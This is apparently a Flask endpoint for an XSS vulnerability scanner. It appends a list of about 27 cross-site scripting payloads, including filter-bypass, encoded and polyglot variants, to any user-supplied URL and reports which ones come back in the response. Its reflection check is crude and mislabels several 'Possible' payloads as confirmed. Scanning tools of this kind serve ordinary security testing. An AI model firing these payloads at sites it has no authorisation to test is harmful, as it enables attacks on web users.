from flask import Blueprint, request, jsonify, send_from_directory
import requests
import os

xss_bp = Blueprint('xss_bp', __name__)

# Path to the folder where backend.py and index.html exist
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Serve the HTML UI
@xss_bp.route("/", methods=["GET"])
def serve_ui():
    return send_from_directory(BASE_DIR, "index.html")

# POST endpoint for scanning XSS vulnerabilities
@xss_bp.route("/api/xss", methods=["POST"])
def scan_xss():
    data = request.get_json()
    target_url = data.get("url")

    if not target_url or "=" not in target_url:
        return jsonify({"error": "Invalid URL. Must include a parameter."}), 400

    PAYLOADS = [
        ("DELTA", "Possible"),

        # simple HTML + classic script
        ("<h1>delta</h1>", "Confirmed"),
        ("<script>alert('delta')</script>", "Confirmed"),

        # attribute / tag-based
        ("\"><img src=x onerror=alert('delta')>", "Confirmed"),
        ("'><svg/onload=alert('delta')>", "Confirmed"),
        ("'><img/src/onerror=alert('delta')>", "Confirmed"),        # weird attr spacing often bypasses filters
        ('"><iframe srcdoc="<script>alert(\'delta\')</script>"></iframe>', "Confirmed"),

        # event-handler variants
        ("'><a href=# onclick=alert('delta')>x</a>", "Confirmed"),
        ('"><input autofocus onfocus=alert("delta")>', "Confirmed"),   # autofocus/onfocus for auto-trigger
        ('"><body onload=alert("delta")>', "Confirmed"),                # body onload (context-dependent)

        # SVG / XML variations (useful against tag filters)
        ('<svg><script>alert("delta")</script></svg>', "Confirmed"),
        ('<svg><foreignObject><body onload=alert("delta")></foreignObject></svg>', "Confirmed"),

        # href / javascript context (requires href sink)
        ('javascript:alert("delta")', "Possible"),
        ('"><a href="javascript:alert(\'delta\')">click</a>', "Possible"),

        # src/data URIs
        ('<img src="data:text/html,<script>alert(\'delta\')</script>">', "Possible"),

        # DOM/hash based (fragment) — used for DOM XSS checks
        ("#<svg/onload=alert('delta')>", "Confirmed (DOM)"),
        ("#'><img src=x onerror=alert('delta')>", "Confirmed (DOM)"),

        # encoded / obfuscated forms (try when filters block obvious tags)
        ("%3Cscript%3Ealert%28%27delta%27%29%3C%2Fscript%3E", "Possible (encoded)"),
        ("\\u003Cscript\\u003Ealert('delta')\\u003C/script\\u003E", "Possible (unicode-escaped)"),

        # polyglot / context-switch attempts
        ("'><svg onload=/*-/*/alert('delta')>//", "Possible"),
        ('"><!--<script>alert("delta")</script>-->', "Possible (comment trick)"),

        # stealthy / non-popup checks (useful if popups blocked — check DOM or console)
        ("<script>console.log('delta')</script>", "Confirmed (stealth)"),
        ("'><svg/onload=console.log('delta')>", "Confirmed (stealth)"),

        # unusual sinks / attribute-breaking attempts
        ('"><button formaction="javascript:alert(\'delta\')">x</button>', "Possible"),
        ("'><details open ontoggle=alert('delta')>x</details>", "Possible"),

        # last resort: template/JS injection contexts (requires JS eval-like sinks)
        ("${alert('delta')}", "Possible (template/JS-eval)"),
        ("`;alert('delta');//", "Possible (JS-string breaking)"),
    ]


    results = []
    for payload, label in PAYLOADS:
        test_url = target_url + payload
        try:
            r = requests.get(test_url, timeout=10)
            body = r.text.lower()
            status = "Safe"
            if payload.lower() in body:
                status = "Possible Vulnerability" if label == "Possible" else "Confirmed Vulnerability"
            results.append({"payload": payload, "url": test_url, "status": status})
        except Exception as e:
            results.append({"payload": payload, "url": test_url, "status": "Error", "error": str(e)})

    return jsonify({"results": results})
